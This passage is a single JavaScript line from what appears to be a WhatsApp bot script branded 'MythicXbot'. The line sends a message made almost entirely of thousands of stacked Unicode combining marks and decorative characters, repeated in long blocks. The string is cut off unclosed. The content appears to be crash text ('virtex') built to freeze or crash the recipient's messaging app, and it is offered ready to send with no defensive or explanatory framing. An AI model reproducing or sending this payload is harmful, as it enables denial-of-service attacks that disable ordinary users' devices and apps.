zoe.sendMessage(from, `ஓঔ🛡⇝͜͡✪𝕷𝖔𝖗𝖉\x20𝕬𝖗𝖎𝖋𝖎🦅\x20͜͡✪*\x0a*~*.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.*999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭999999**ผิดุท้่เึางืผิดุท้่เึางื**9999999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭৭৭৭৭৭*MythicXbot*๒๒๒๒๒๒๒๒*MythicXbot*৭৭৭৭৭৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́